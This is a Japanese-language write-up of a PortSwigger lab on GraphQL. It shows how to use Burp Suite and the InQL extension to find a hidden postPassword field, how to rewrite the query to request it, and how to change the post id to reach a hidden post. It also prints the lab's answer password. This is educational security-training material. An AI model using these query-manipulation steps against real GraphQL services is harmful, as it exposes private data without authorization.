# プライベート GraphQL 投稿へのアクセス

次のハッキングラボを実施します  
https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts  
このラボのブログ ページには、秘密のパスワードが設定された非表示のブログ投稿が含まれています。ラボを解決するには、非表示のブログ投稿を見つけてパスワードを入力します。

[前準備]

- 本ラボでは Burp Suite の拡張機能 inQL を使用します。  
  次の URL から jar ファイルをダウンロードしてインストールします。  
  https://github.com/doyensec/inql/releases

[手順]

- 1. BurpSuite を起動して、Proxy タブからブラウザを起動します
- 2. ブラウザからハッキングラボにアクセスします
- 3. ブログのポストページにアクセスします
- 4. http history からリクエスト POST /graphql/v1 HTTP/2 の GraphQL タブを選択します
- 5. 右クリックでコンテキストメニューを開き、Generate queries with InQL Scanner を選択
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/d69485ce-5e38-4c4b-8551-98b6b407c65a)
- 6. InQL タブに移動し、スキャン結果を確認します。  
     BlogPost には postPassword のフィールドがあることが確認できます。
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/80baa4d5-a41a-4721-aa81-0090da96103f)
- 7. POST /graphql/v1 HTTP/2 リクエストを send to repeater します
- 8. repeater タブに移動し、GraphQL タブから postPassword を取得するように書き換えます

```graphql
query getBlogPost($id: Int!) {
  getBlogPost(id: $id) {
    image
    title
    author
    date
    paragraphs
    postPassword
  }
}
```

- 9. ブログポスト id=3 が存在しないため、graphQL パラメータを 3 に変更します

```
{"variables": {"id": 3}, "query": "query getBlogPost($id: Int!) {\n    getBlogPost(id: $id) {\n        image\n        title\n        author\n        date\n        paragraphs\n        postPassword\n    }\n}"}
```

- 10. 送信するとパスワードが取得できます

```
"postPassword": "o6z2bcyywwk0es0d7an5v6munvolrt6k"
```
